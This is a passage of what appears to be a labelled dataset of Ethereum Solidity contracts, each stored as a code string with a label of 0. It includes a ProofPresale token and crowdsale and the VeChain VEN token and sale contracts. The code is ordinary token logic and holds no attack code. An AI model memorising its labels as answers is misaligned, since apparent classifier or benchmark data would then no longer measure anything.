owner. *\/ modifier onlyOwner() { require(msg.sender == owner); _; } \/** * @dev Allows the current owner to transfer control of the contract to a newOwner. * @param newOwner The address to transfer ownership to. *\/ function transferOwnership(address newOwner) onlyOwner { if (newOwner != address(0)) { owner = newOwner; } }}\/** * @title Pausable * @dev Base contract which allows children to implement an emergency stop mechanism. *\/contract Pausable is Ownable { event Pause(); event Unpause(); bool public paused = false; \/** * @dev modifier to allow actions only when the contract IS paused *\/ modifier whenNotPaused() { require(!paused); _; } \/** * @dev modifier to allow actions only when the contract IS NOT paused *\/ modifier whenPaused { require(paused); _; } \/** * @dev called by the owner to pause, triggers stopped state *\/ function pause() onlyOwner whenNotPaused returns (bool) { paused = true; Pause(); return true; } \/** * @dev called by the owner to unpause, returns to normal state *\/ function unpause() onlyOwner whenPaused returns (bool) { paused = false; Unpause(); return true; }}\/** * @title ERC20 interface * @dev see https:\/\/github.com\/ethereum\/EIPs\/issues\/20 *\/contract ERC20 { uint256 public totalSupply; function balanceOf(address _owner) constant returns (uint256); function transfer(address _to, uint256 _value) returns (bool); function transferFrom(address _from, address _to, uint256 _value) returns (bool); function approve(address _spender, uint256 _value) returns (bool); function allowance(address _owner, address _spender) constant returns (uint256); event Transfer(address indexed _from, address indexed _to, uint256 _value); event Approval(address indexed _owner, address indexed _spender, uint256 _value);}\/** * @title ProofPresaleToken (PROOFP) * Standard Mintable ERC20 Token * https:\/\/github.com\/ethereum\/EIPs\/issues\/20 * Based on code by FirstBlood: * https:\/\/github.com\/Firstbloodio\/token\/blob\/master\/smart_contract\/FirstBloodToken.sol *\/contract ProofPresaleToken is ERC20, Ownable { using SafeMath for uint256; mapping(address => uint) balances; mapping (address => mapping (address => uint)) allowed; string public constant name = \"Proof Presale Token\"; string public constant symbol = \"PPT\"; uint8 public constant decimals = 18; bool public mintingFinished = false; event Mint(address indexed to, uint256 amount); event MintFinished(); function ProofPresaleToken() {} function() payable { revert(); } function balanceOf(address _owner) constant returns (uint256) { return balances[_owner]; } function transfer(address _to, uint _value) returns (bool) { balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(_value); Transfer(msg.sender, _to, _value); return true; } function transferFrom(address _from, address _to, uint _value) returns (bool) { var _allowance = allowed[_from][msg.sender]; balances[_to] = balances[_to].add(_value); balances[_from] = balances[_from].sub(_value); allowed[_from][msg.sender] = _allowance.sub(_value); Transfer(_from, _to, _value); return true; } function approve(address _spender, uint _value) returns (bool) { allowed[msg.sender][_spender] = _value; Approval(msg.sender, _spender, _value); return true; } function allowance(address _owner, address _spender) constant returns (uint256) { return allowed[_owner][_spender]; } modifier canMint() { require(!mintingFinished); _; } \/** * Function to mint tokens * @param _to The address that will recieve the minted tokens. * @param _amount The amount of tokens to mint. * @return A boolean that indicates if the operation was successful. *\/ function mint(address _to, uint256 _amount) onlyOwner canMint returns (bool) { totalSupply = totalSupply.add(_amount); balances[_to] = balances[_to].add(_amount); Mint(_to, _amount); return true; } \/** * Function to stop minting new tokens. * @return True if the operation was successful. *\/ function finishMinting() onlyOwner returns (bool) { mintingFinished = true; MintFinished(); return true; } }\/** * @title ProofPresale * ProofPresale allows investors to make * token purchases and assigns them tokens based * on a token per ETH rate. Funds collected are forwarded to a wallet * as they arrive. *\/ contract ProofPresale is Pausable { using SafeMath for uint256; ProofPresaleToken public token; address public wallet; uint256 public weiRaised; uint256 public cap; uint256 public minInvestment; uint256 public rate; bool public isFinalized; string public contactInformation; \/** * event for token purchase logging * @param purchaser who paid for the tokens * @param beneficiary who got the tokens * @param value weis paid for purchase * @param amount amount of tokens purchased *\/ event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount); \/** * event for signaling finished crowdsale *\/ event Finalized(); function ProofPresale() { token = createTokenContract(); wallet = 0x99892Ac6DA1b3851167Cb959fE945926bca89f09; rate = 20; minInvestment = 10 ether; cap = 295257 * (10**18); } function createTokenContract() internal returns (ProofPresaleToken) { return new ProofPresaleToken(); } function () payable { buyTokens(msg.sender); } \/** * Low level token purchse function * @param beneficiary will recieve the tokens. *\/ function buyTokens(address beneficiary) payable whenNotPaused { require(beneficiary != 0x0); require(validPurchase()); uint256 weiAmount = msg.value; weiRaised = weiRaised.add(weiAmount); uint256 tokens = weiAmount.mul(rate); token.mint(beneficiary, tokens); TokenPurchase(msg.sender, beneficiary, weiAmount, tokens); forwardFunds(); } function forwardFunds() internal { wallet.transfer(msg.value); } function validPurchase() internal constant returns (bool) { uint256 weiAmount = weiRaised.add(msg.value); bool notSmallAmount = msg.value >= minInvestment; bool withinCap = weiAmount.mul(rate) <= cap; return (notSmallAmount && withinCap); } function finalize() onlyOwner { require(!isFinalized); require(hasEnded()); token.finishMinting(); Finalized(); isFinalized = true; } function setContactInformation(string info) onlyOwner { contactInformation = info; } function hasEnded() public constant returns (bool) { bool capReached = (weiRaised.mul(rate) >= cap); return capReached; }}","label":0}
{"code":"pragma solidity ^0.4.11;\r\r\n\r\r\ncontract Owned {\r\r\n\r\r\n    address public owner;\r\r\n\r\r\n    function Owned() {\r\r\n        owner = msg.sender;\r\r\n    }\r\r\n\r\r\n    modifier onlyOwner() {\r\r\n        require(msg.sender == owner);\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    function setOwner(address _newOwner) onlyOwner {\r\r\n        owner = _newOwner;\r\r\n    }\r\r\n}\r\r\n\r\r\n\/**\r\r\n * @title SafeMath\r\r\n * @dev Math operations with safety checks that throw on error\r\r\n *\/\r\r\nlibrary SafeMath {\r\r\n  function mul(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    uint256 c = a * b;\r\r\n    assert(a == 0 || c \/ a == b);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function div(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    \/\/ assert(b > 0); \/\/ Solidity automatically throws when dividing by 0\r\r\n    uint256 c = a \/ b;\r\r\n    \/\/ assert(a == b * c + a % b); \/\/ There is no case in which this doesn&#39;t hold\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function sub(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    assert(b <= a);\r\r\n    return a - b;\r\r\n  }\r\r\n\r\r\n  function add(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    uint256 c = a + b;\r\r\n    assert(c >= a);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function toUINT112(uint256 a) internal constant returns(uint112) {\r\r\n    assert(uint112(a) == a);\r\r\n    return uint112(a);\r\r\n  }\r\r\n\r\r\n  function toUINT120(uint256 a) internal constant returns(uint120) {\r\r\n    assert(uint120(a) == a);\r\r\n    return uint120(a);\r\r\n  }\r\r\n\r\r\n  function toUINT128(uint256 a) internal constant returns(uint128) {\r\r\n    assert(uint128(a) == a);\r\r\n    return uint128(a);\r\r\n  }\r\r\n}\r\r\n\r\r\n\r\r\n\/\/ Abstract contract for the full ERC 20 Token standard\r\r\n\/\/ https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\n\r\r\ncontract Token {\r\r\n    \/* This is a slight change to the ERC20 base standard.\r\r\n    function totalSupply() constant returns (uint256 supply);\r\r\n    is replaced with:\r\r\n    uint256 public totalSupply;\r\r\n    This automatically creates a getter function for the totalSupply.\r\r\n    This is moved to the base contract since public getter functions are not\r\r\n    currently recognised as an implementation of the matching abstract\r\r\n    function by the compiler.\r\r\n    *\/\r\r\n    \/\/\/ total amount of tokens\r\r\n    \/\/uint256 public totalSupply;\r\r\n    function totalSupply() constant returns (uint256 supply);\r\r\n\r\r\n    \/\/\/ @param _owner The address from which the balance will be retrieved\r\r\n    \/\/\/ @return The balance\r\r\n    function balanceOf(address _owner) constant returns (uint256 balance);\r\r\n\r\r\n    \/\/\/ @notice send `_value` token to `_to` from `msg.sender`\r\r\n    \/\/\/ @param _to The address of the recipient\r\r\n    \/\/\/ @param _value The amount of token to be transferred\r\r\n    \/\/\/ @return Whether the transfer was successful or not\r\r\n    function transfer(address _to, uint256 _value) returns (bool success);\r\r\n\r\r\n    \/\/\/ @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\r\n    \/\/\/ @param _from The address of the sender\r\r\n    \/\/\/ @param _to The address of the recipient\r\r\n    \/\/\/ @param _value The amount of token to be transferred\r\r\n    \/\/\/ @return Whether the transfer was successful or not\r\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\r\r\n\r\r\n    \/\/\/ @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\r\n    \/\/\/ @param _spender The address of the account able to transfer the tokens\r\r\n    \/\/\/ @param _value The amount of wei to be approved for transfer\r\r\n    \/\/\/ @return Whether the approval was successful or not\r\r\n    function approve(address _spender, uint256 _value) returns (bool success);\r\r\n\r\r\n    \/\/\/ @param _owner The address of the account owning tokens\r\r\n    \/\/\/ @param _spender The address of the account able to transfer the tokens\r\r\n    \/\/\/ @return Amount of remaining tokens allowed to spent\r\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining);\r\r\n\r\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\r\n}\r\r\n\r\r\n\r\r\n\/\/\/ VEN token, ERC20 compliant\r\r\ncontract VEN is Token, Owned {\r\r\n    using SafeMath for uint256;\r\r\n\r\r\n    string public constant name    = \"VeChain Token\";  \/\/The Token&#39;s name\r\r\n    uint8 public constant decimals = 18;               \/\/Number of decimals of the smallest unit\r\r\n    string public constant symbol  = \"VEN\";            \/\/An identifier    \r\r\n\r\r\n    \/\/ packed to 256bit to save gas usage.\r\r\n    struct Supplies {\r\r\n        \/\/ uint128&#39;s max value is about 3e38.\r\r\n        \/\/ it&#39;s enough to present amount of tokens\r\r\n        uint128 total;\r\r\n        uint128 rawTokens;\r\r\n    }\r\r\n\r\r\n    Supplies supplies;\r\r\n\r\r\n    \/\/ Packed to 256bit to save gas usage.    \r\r\n    struct Account {\r\r\n        \/\/ uint112&#39;s max value is about 5e33.\r\r\n        \/\/ it&#39;s enough to present amount of tokens\r\r\n        uint112 balance;\r\r\n\r\r\n        \/\/ raw token can be transformed into balance with bonus        \r\r\n        uint112 rawTokens;\r\r\n\r\r\n        \/\/ safe to store timestamp\r\r\n        uint32 lastMintedTimestamp;\r\r\n    }\r\r\n\r\r\n    \/\/ Balances for each account\r\r\n    mapping(address => Account) accounts;\r\r\n\r\r\n    \/\/ Owner of account approves the transfer of an amount to another account\r\r\n    mapping(address => mapping(address => uint256)) allowed;\r\r\n\r\r\n    \/\/ bonus that can be shared by raw tokens\r\r\n    uint256 bonusOffered;\r\r\n\r\r\n    \/\/ Constructor\r\r\n    function VEN() {\r\r\n    }\r\r\n\r\r\n    function totalSupply() constant returns (uint256 supply){\r\r\n        return supplies.total;\r\r\n    }\r\r\n\r\r\n    \/\/ Send back ether sent to me\r\r\n    function () {\r\r\n        revert();\r\r\n    }\r\r\n\r\r\n    \/\/ If sealed, transfer is enabled and mint is disabled\r\r\n    function isSealed() constant returns (bool) {\r\r\n        return owner == 0;\r\r\n    }\r\r\n\r\r\n    function lastMintedTimestamp(address _owner) constant returns(uint32) {\r\r\n        return accounts[_owner].lastMintedTimestamp;\r\r\n    }\r\r\n\r\r\n    \/\/ Claim bonus by raw tokens\r\r\n    function claimBonus(address _owner) internal{      \r\r\n        require(isSealed());\r\r\n        if (accounts[_owner].rawTokens != 0) {\r\r\n            uint256 realBalance = balanceOf(_owner);\r\r\n            uint256 bonus = realBalance\r\r\n                .sub(accounts[_owner].balance)\r\r\n                .sub(accounts[_owner].rawTokens);\r\r\n\r\r\n            accounts[_owner].balance = realBalance.toUINT112();\r\r\n            accounts[_owner].rawTokens = 0;\r\r\n            if(bonus > 0){\r\r\n                Transfer(this, _owner, bonus);\r\r\n            }\r\r\n        }\r\r\n    }\r\r\n\r\r\n    \/\/ What is the balance of a particular account?\r\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\r\n        if (accounts[_owner].rawTokens == 0)\r\r\n            return accounts[_owner].balance;\r\r\n\r\r\n        if (bonusOffered > 0) {\r\r\n            uint256 bonus = bonusOffered\r\r\n                 .mul(accounts[_owner].rawTokens)\r\r\n                 .div(supplies.rawTokens);\r\r\n\r\r\n            return bonus.add(accounts[_owner].balance)\r\r\n                    .add(accounts[_owner].rawTokens);\r\r\n        }\r\r\n        \r\r\n        return uint256(accounts[_owner].balance)\r\r\n            .add(accounts[_owner].rawTokens);\r\r\n    }\r\r\n\r\r\n    \/\/ Transfer the balance from owner&#39;s account to another account\r\r\n    function transfer(address _to, uint256 _amount) returns (bool success) {\r\r\n        require(isSealed());\r\r\n\r\r\n        \/\/ implicitly claim bonus for both sender and receiver\r\r\n        claimBonus(msg.sender);\r\r\n        claimBonus(_to);\r\r\n\r\r\n        \/\/ according to VEN&#39;s total supply, never overflow here\r\r\n        if (accounts[msg.sender].balance >= _amount\r\r\n            && _amount > 0) {            \r\r\n            accounts[msg.sender].balance -= uint112(_amount);\r\r\n            accounts[_to].balance = _amount.add(accounts[_to].balance).toUINT112();\r\r\n            Transfer(msg.sender, _to, _amount);\r\r\n            return true;\r\r\n        } else {\r\r\n            return false;\r\r\n        }\r\r\n    }\r\r\n\r\r\n    \/\/ Send _value amount of tokens from address _from to address _to\r\r\n    \/\/ The transferFrom method is used for a withdraw workflow, allowing contracts to send\r\r\n    \/\/ tokens on your behalf, for example to \"deposit\" to a contract address and\/or to charge\r\r\n    \/\/ fees in sub-currencies; the command should fail unless the _from account has\r\r\n    \/\/ deliberately authorized the sender of the message via some mechanism; we propose\r\r\n    \/\/ these standardized APIs for approval:\r\r\n    function transferFrom(\r\r\n        address _from,\r\r\n        address _to,\r\r\n        uint256 _amount\r\r\n    ) returns (bool success) {\r\r\n        require(isSealed());\r\r\n\r\r\n        \/\/ implicitly claim bonus for both sender and receiver\r\r\n        claimBonus(_from);\r\r\n        claimBonus(_to);\r\r\n\r\r\n        \/\/ according to VEN&#39;s total supply, never overflow here\r\r\n        if (accounts[_from].balance >= _amount\r\r\n            && allowed[_from][msg.sender] >= _amount\r\r\n            && _amount > 0) {\r\r\n            accounts[_from].balance -= uint112(_amount);\r\r\n            allowed[_from][msg.sender] -= _amount;\r\r\n            accounts[_to].balance = _amount.add(accounts[_to].balance).toUINT112();\r\r\n            Transfer(_from, _to, _amount);\r\r\n            return true;\r\r\n        } else {\r\r\n            return false;\r\r\n        }\r\r\n    }\r\r\n\r\r\n    \/\/ Allow _spender to withdraw from your account, multiple times, up to the _value amount.\r\r\n    \/\/ If this function is called again it overwrites the current allowance with _value.\r\r\n    function approve(address _spender, uint256 _amount) returns (bool success) {\r\r\n        allowed[msg.sender][_spender] = _amount;\r\r\n        Approval(msg.sender, _spender, _amount);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    \/* Approves and then calls the receiving contract *\/\r\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\r\n        allowed[msg.sender][_spender] = _value;\r\r\n        Approval(msg.sender, _spender, _value);\r\r\n\r\r\n        \/\/call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn&#39;t have to include a contract in here just for this.\r\r\n        \/\/receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\r\n        \/\/it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\r\n        \/\/if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\r\r\n        ApprovalReceiver(_spender).receiveApproval(msg.sender, _value, this, _extraData);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\r\n        return allowed[_owner][_spender];\r\r\n    }\r\r\n\r\r\n    \/\/ Mint tokens and assign to some one\r\r\n    function mint(address _owner, uint256 _amount, bool _isRaw, uint32 timestamp) onlyOwner{\r\r\n        if (_isRaw) {\r\r\n            accounts[_owner].rawTokens = _amount.add(accounts[_owner].rawTokens).toUINT112();\r\r\n            supplies.rawTokens = _amount.add(supplies.rawTokens).toUINT128();\r\r\n        } else {\r\r\n            accounts[_owner].balance = _amount.add(accounts[_owner].balance).toUINT112();\r\r\n        }\r\r\n\r\r\n        accounts[_owner].lastMintedTimestamp = timestamp;\r\r\n\r\r\n        supplies.total = _amount.add(supplies.total).toUINT128();\r\r\n        Transfer(0, _owner, _amount);\r\r\n    }\r\r\n    \r\r\n    \/\/ Offer bonus to raw tokens holder\r\r\n    function offerBonus(uint256 _bonus) onlyOwner { \r\r\n        bonusOffered = bonusOffered.add(_bonus);\r\r\n        supplies.total = _bonus.add(supplies.total).toUINT128();\r\r\n        Transfer(0, this, _bonus);\r\r\n    }\r\r\n\r\r\n    \/\/ Set owner to zero address, to disable mint, and enable token transfer\r\r\n    function seal() onlyOwner {\r\r\n        setOwner(0);\r\r\n    }\r\r\n}\r\r\n\r\r\ncontract ApprovalReceiver {\r\r\n    function receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData);\r\r\n}\r\r\n\r\r\n\r\r\n\/\/ Contract to sell and distribute VEN tokens\r\r\ncontract VENSale is Owned{\r\r\n\r\r\n    \/\/\/ chart of stage transition \r\r\n    \/\/\/\r\r\n    \/\/\/ deploy   initialize      startTime                            endTime                 finalize\r\r\n    \/\/\/                              | <-earlyStageLasts-> |             | <- closedStageLasts -> |\r\r\n    \/\/\/  O-----------O---------------O---------------------O-------------O------------------------O------------>\r\r\n    \/\/\/     Created     Initialized           Early             Normal             Closed            Finalized\r\r\n    enum Stage {\r\r\n        NotCreated,\r\r\n        Created,\r\r\n        Initialized,\r\r\n        Early,\r\r\n        Normal,\r\r\n        Closed,\r\r\n        Finalized\r\r\n    }\r\r\n\r\r\n    using SafeMath for uint256;\r\r\n    \r\r\n    uint256 public constant totalSupply         = (10 ** 9) * (10 ** 18); \/\/ 1 billion VEN, decimals set to 18\r\r\n\r\r\n    uint256 constant privateSupply              = totalSupply * 9 \/ 100;  \/\/ 9% for private ICO\r\r\n    uint256 constant commercialPlan             = totalSupply * 23 \/ 100; \/\/ 23% for commercial plan\r\r\n    uint256 constant reservedForTeam            = totalSupply * 5 \/ 100;  \/\/ 5% for team\r\r\n    uint256 constant reservedForOperations      = totalSupply * 22 \/ 100; \/\/ 22 for operations\r\r\n\r\r\n    \/\/ 59%\r\r\n    uint256 public constant nonPublicSupply     = privateSupply + commercialPlan + reservedForTeam + reservedForOperations;\r\r\n    \/\/ 41%\r\r\n    uint256 public constant publicSupply = totalSupply - nonPublicSupply;\r\r\n\r\r\n\r\r\n    uint256 public constant officialLimit = 64371825 * (10 ** 18);\r\r\n    uint256 public constant channelsLimit = publicSupply - officialLimit;\r\r\n\r\r\n    \/\/ packed to 256bit\r\r\n    struct SoldOut {\r\r\n        uint16 placeholder; \/\/ placeholder to make struct pre-alloced\r\r\n\r\r\n        \/\/ amount of tokens officially sold out.\r\r\n        \/\/ max value of 120bit is about 1e36, it&#39;s enough for token amount\r\r\n        uint120 official; \r\r\n\r\r\n        uint120 channels; \/\/ amount of tokens sold out via channels\r\r\n    }\r\r\n\r\r\n    SoldOut soldOut;\r\r\n    \r\r\n    uint256 constant venPerEth = 3500;  \/\/ normal exchange rate\r\r\n    uint256 constant venPerEthEarlyStage = venPerEth + venPerEth * 15 \/ 100;  \/\/ early stage has 15% reward\r\r\n\r\r\n    uint constant minBuyInterval = 30 minutes; \/\/ each account can buy once in 30 minutes\r\r\n    uint constant maxBuyEthAmount = 30 ether;\r\r\n   \r\r\n    VEN ven; \/\/ VEN token contract follows ERC20 standard\r\r\n\r\r\n    address ethVault; \/\/ the account to keep received ether\r\r\n    address venVault; \/\/ the account to keep non-public offered VEN tokens\r\r\n\r\r\n    uint public constant startTime = 1503057600; \/\/ time to start sale\r\r\n    uint public constant endTime = 1504180800;   \/\/ tiem to close sale\r\r\n    uint public constant earlyStageLasts = 3 days; \/\/ early bird stage lasts in seconds\r\r\n\r\r\n    bool initialized;\r\r\n    bool finalized;\r\r\n\r\r\n    function VENSale() {\r\r\n        soldOut.placeholder = 1;\r\r\n    }    \r\r\n\r\r\n    \/\/\/ @notice calculte exchange rate according to current stage\r\r\n    \/\/\/ @return exchange rate. zero if not in sale.\r\r\n    function exchangeRate() constant returns (uint256){\r\r\n        if (stage() == Stage.Early) {\r\r\n            return venPerEthEarlyStage;\r\r\n        }\r\r\n        if (stage() == Stage.Normal) {\r\r\n            return venPerEth;\r\r\n        }\r\r\n        return 0;\r\r\n    }\r\r\n\r\r\n    \/\/\/ @notice for test purpose\r\r\n    function blockTime() constant returns (uint32) {\r\r\n        return uint32(block.timestamp);\r\r\n    }\r\r\n\r\r\n    \/\/\/ @notice estimate stage\r\r\n    \/\/\/ @return current stage\r\r\n    function stage() constant returns (Stage) { \r\r\n        if (finalized) {\r\r\n            return Stage.Finalized;\r\r\n        }\r\r\n\r\r\n        if (!initialized) {\r\r\n            \/\/ deployed but not initialized\r\r\n            return Stage.Created;\r\r\n        }\r\r\n\r\r\n        if (blockTime() < startTime) {\r\r\n            \/\/ not started yet\r\r\n            return Stage.Initialized;\r\r\n        }\r\r\n\r\r\n        if (uint256(soldOut.official).add(soldOut.channels) >= publicSupply) {\r\r\n            \/\/ all sold out\r\r\n            return Stage.Closed;\r\r\n        }\r\r\n\r\r\n        if (blockTime() < endTime) {\r\r\n            \/\/ in sale            \r\r\n            if (blockTime() < startTime.add(earlyStageLasts)) {\r\r\n                \/\/ early bird stage\r\r\n                return Stage.Early;\r\r\n            }\r\r\n            \/\/ normal stage\r\r\n            return Stage.Normal;\r\r\n        }\r\r\n\r\r\n        \/\/ closed\r\r\n        return Stage.Closed;\r\r\n    }\r\r\n\r\r\n    function isContract(address _addr) constant internal returns(bool) {\r\r\n        uint size;\r\r\n        if (_addr == 0) return false;\r\r\n        assembly {\r\r\n            size := extcodesize(_addr)\r\r\n        }\r\r\n        return size > 0;\r\r\n    }\r\r\n\r\r\n    \/\/\/ @notice entry to buy tokens\r\r\n    function () payable {        \r\r\n        buy();\r\r\n    }\r\r\n\r\r\n    \/\/\/ @notice entry to buy tokens\r\r\n    function buy() payable {\r\r\n        \/\/ reject contract buyer to avoid breaking interval limit\r\r\n        require(!isContract(msg.sender));\r\r\n        require(msg.value >= 0.01 ether);\r\r\n\r\r\n        uint256 rate = exchangeRate();\r\r\n        \/\/ here don&#39;t need to check stage. rate is only valid when in sale\r\r\n        require(rate > 0);\r\r\n        \/\/ each account is allowed once in minBuyInterval\r\r\n        require(blockTime() >= ven.lastMintedTimestamp(msg.sender) + minBuyInterval);\r\r\n\r\r\n        uint256 requested;\r\r\n        \/\/ and limited to maxBuyEthAmount\r\r\n        if (msg.value > maxBuyEthAmount) {\r\r\n            requested = maxBuyEthAmount.mul(rate);\r\r\n        } else {\r\r\n            requested = msg.value.mul(rate);\r\r\n        }\r\r\n\r\r\n        uint256 remained = officialLimit.sub(soldOut.official);\r\r\n        if (requested > remained) {\r\r\n            \/\/exceed remained\r\r\n            requested = remained;\r\r\n        }\r\r\n\r\r\n        uint256 ethCost = requested.div(rate);\r\r\n        if (requested > 0) {\r\r\n            ven.mint(msg.sender, requested, true, blockTime());\r\r\n            \/\/ transfer ETH to vault\r\r\n            ethVault.transfer(ethCost);\r\r\n\r\r\n            soldOut.official = requested.add(soldOut.official).toUINT120();\r\r\n            onSold(msg.sender, requested, ethCost);        \r\r\n        }\r\r\n\r\r\n        uint256 toReturn = msg.value.sub(ethCost);\r\r\n        if(toReturn > 0) {\r\r\n            \/\/ return over payed ETH\r\r\n            msg.sender.transfer(toReturn);\r\r\n        }        \r\r\n    }\r\r\n\r\r\n    \/\/\/ @notice returns tokens sold officially\r\r\n    function officialSold() constant returns (uint256) {\r\r\n        return soldOut.official;\r\r\n    }\r\r\n\r\r\n    \/\/\/ @notice returns tokens sold via channels\r\r\n    function channelsSold() constant returns (uint256) {\r\r\n        return soldOut.channels;\r\r\n    } \r\r\n\r\r\n    \/\/\/ @notice manually offer tokens to channel\r\r\n    function offerToChannel(address _channelAccount, uint256 _venAmount) onlyOwner {\r\r\n        Stage stg = stage();\r\r\n        \/\/ since the settlement may be delayed, so it&#39;s allowed in closed stage\r\r\n        require(stg == Stage.Early || stg == Stage.Normal || stg == Stage.Closed);\r\r\n\r\r\n        soldOut.channels = _venAmount.add(soldOut.channels).toUINT120();\r\r\n\r\r\n        \/\/should not exceed limit\r\r\n        require(soldOut.channels <= channelsLimit);\r\r\n\r\r\n        ven.mint(\r\r\n            _channelAccount,\r\r\n            _venAmount,\r\r\n            true,  \/\/ unsold tokens can be claimed by channels portion\r\r\n            blockTime()\r\r\n            );\r\r\n\r\r\n        onSold(_channelAccount, _venAmount, 0);\r\r\n    }\r\r\n\r\r\n    \/\/\/ @notice initialize to prepare for sale\r\r\n    \/\/\/ @param _ven The address VEN token contract following ERC20 standard\r\r\n    \/\/\/ @param _ethVault The place to store received ETH\r\r\n    \/\/\/ @param _venVault The place to store non-publicly supplied VEN tokens\r\r\n    function initialize(\r\r\n        VEN _ven,\r\r\n        address _ethVault,\r\r\n        address _venVault) onlyOwner {\r\r\n        require(stage() == Stage.Created);\r\r\n\r\r\n        \/\/ ownership of token contract should already be this\r\r\n        require(_ven.owner() == address(this));\r\r\n\r\r\n        require(address(_ethVault) != 0);\r\r\n        require(address(_venVault) != 0);      \r\r\n\r\r\n        ven = _ven;\r\r\n        \r\r\n        ethVault = _ethVault;\r\r\n        venVault = _venVault;    \r\r\n        \r\r\n        ven.mint(\r\r\n            venVault,\r\r\n            reservedForTeam.add(reservedForOperations),\r\r\n            false, \/\/ team and operations reserved portion can&#39;t share unsold tokens\r\r\n            blockTime()\r\r\n        );\r\r\n\r\r\n        ven.mint(\r\r\n            venVault,\r\r\n            privateSupply.add(commercialPlan),\r\r\n            true, \/\/ private ICO and commercial plan can share unsold tokens\r\r\n            blockTime()\r\r\n        );\r\r\n\r\r\n        initialized = true;\r\r\n        onInitialized();\r\r\n    }\r\r\n\r\r\n    \/\/\/ @notice finalize\r\r\n    function finalize() onlyOwner {\r\r\n        \/\/ only after closed stage\r\r\n        require(stage() == Stage.Closed);       \r\r\n\r\r\n        uint256 unsold = publicSupply.sub(soldOut.official).sub(soldOut.channels);\r\r\n\r\r\n        if (unsold > 0) {\r\r\n            \/\/ unsold VEN as bonus\r\r\n            ven.offerBonus(unsold);        \r\r\n        }\r\r\n        ven.seal();\r\r\n\r\r\n        finalized = true;\r\r\n        onFinalized();\r\r\n    }\r\r\n\r\r\n    event onInitialized();\r\r\n    event onFinalized();\r\r\n\r\r\n    event onSold(address indexed buyer, uint256 venAmount, uint256 ethCost);\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.18;\r\r\n\r\r\n\/\/ File: contracts\/ReceivingContractCallback.sol\r\r\n\r\r\ncontract ReceivingContractCallback {\r\r\n\r\r\n  function tokenFallback(address _from, uint _value) public;\r\r\n\r\r\n}\r\r\n\r\r\n\/\/ File: contracts\/ownership\/Ownable.sol\r\r\n\r\r\n\/**\r\r\n * @title Ownable\r\r\n * @dev The Ownable contract has an owner address, and provides basic authorization control\r\r\n * functions, this simplifies the implementation of \"user permissions\".\r\r\n *\/\r\r\ncontract Ownable {\r\r\n  address public owner;\r\r\n\r\r\n\r\r\n  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\r\n\r\r\n\r\r\n  \/**\r\r\n   * @dev The Ownable constructor sets the original `owner` of the contract to the sender\r\r\n   * account.\r\r\n   *\/\r\r\n  function Ownable() public {\r\r\n    owner = msg.sender;\r\r\n  }\r\r\n\r\r\n\r\r\n  \/**\r\r\n   * @dev Throws if called by any account other than the owner.\r\r\n   *\/\r\r\n  modifier onlyOwner() {\r\r\n    require(msg.sender == owner);\r\r\n    _;\r\r\n  }\r\r\n\r\r\n\r\r\n  \/**\r\r\n   * @dev Allows the current owner to transfer control of the contract to a newOwner.\r\r\n   * @param newOwner The address to transfer ownership to.\r\r\n   *\/\r\r\n  function transferOwnership(address newOwner) public onlyOwner {\r\r\n    require(newOwner != address(0));\r\r\n    OwnershipTransferred(owner, newOwner);\r\r\n    owner = newOwner;\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\/\/ File: contracts\/math\/SafeMath.sol\r\r\n\r\r\n\/**\r\r\n * @title SafeMath\r\r\n * @dev Math operations with safety checks that throw on error\r\r\n *\/\r\r\nlibrary SafeMath {\r\r\n  function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\r\n    if (a == 0) {\r\r\n      return 0;\r\r\n    }\r\r\n    uint256 c = a * b;\r\r\n    assert(c \/ a == b);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\r\n    \/\/ assert(b > 0); \/\/ Solidity automatically throws when dividing by 0\r\r\n    uint256 c = a \/ b;\r\r\n    \/\/ assert(a == b * c + a % b); \/\/ There is no case in which this doesn&#39;t hold\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\r\n    assert(b <= a);\r\r\n    return a - b;\r\r\n  }\r\r\n\r\r\n  function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\r\n    uint256 c = a + b;\r\r\n    assert(c >= a);\r\r\n    return c;\r\r\n  }\r\r\n}\r\r\n\r\r\n\/\/ File: contracts\/token\/ERC20Basic.sol\r\r\n\r\r\n\/**\r\r\n * @title ERC20Basic\r\r\n * @dev Simpler version of ERC20 interface\r\r\n * @dev see https:\/\/github.com\/ethereum\/EIPs\/issues\/179\r\r\n *\/\r\r\ncontract ERC20Basic {\r\r\n  uint256 public 